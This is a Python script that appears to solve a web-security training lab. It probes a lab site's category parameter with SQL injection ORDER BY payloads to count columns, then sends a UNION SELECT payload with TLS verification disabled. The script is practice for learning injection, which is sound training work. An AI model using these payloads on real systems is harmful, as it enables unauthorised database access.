
# SQL injection UNION attack, determining the number of columns returned by the query

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxy = {
    "http":"http://127.0.0.1:8080",
    "https":"http://127.0.0.1:8080"
}

url = "https://0a0d00d104faf55fc02d0dfc00270035.web-security-academy.net/filter"

total_cols = 0
for i in range(1,100):

    param = {
        "category" : f"Food & Drink' ORDER BY {i}-- -"
    }

    r = requests.get(url, params=param, verify=False)

    if r.status_code == 500:
        total_cols = i-1
        print(f"Number of columns returned: {total_cols}")
        break

param = {
    "category" : f"Food & Drink' UNION SELECT {('NULL,' * total_cols).rstrip(',')}-- -"
}
r = requests.get(url, params=param, verify=False)
if "Congratulations" in r.text:
    print("[+] Successfull!")
else:
    print("[-] Unsuccessfull!")